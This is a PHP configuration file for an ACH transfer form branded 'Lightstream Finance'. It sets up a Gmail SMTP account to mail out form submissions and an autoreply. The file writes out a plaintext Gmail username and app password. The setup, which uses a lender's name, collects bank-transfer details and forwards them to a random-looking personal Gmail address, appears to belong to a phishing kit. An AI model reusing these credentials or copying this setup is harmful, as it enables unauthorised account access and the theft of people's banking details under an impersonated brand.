<?php
/**
 * Configuration file for Lightstream Finance ACH Transfer Form
 * Keep this file secure and outside web root in production
 */

define('SMTP_HOST', 'smtp.gmail.com');
define('SMTP_USERNAME', 'kcincogenq@gmail.com');
define('SMTP_PASSWORD', 'xqltislvtzorgizh');
define('SMTP_SECURE', 'tls');
define('SMTP_PORT', 587);
define('SMTP_AUTH', true);

define('FROM_NAME', 'Lightstream Finance');
define('EMAIL_SUBJECT_DEFAULT', '[Lightstream Finance] New ACH Transfer Form Submission');
define('EMAIL_SUBJECT_AUTOREPLY', 'ACH Transfer Form Received');

define('MAX_ATTEMPTS', 5);
define('RATE_LIMIT_DURATION', 3600);

define('DEBUG_MODE', false);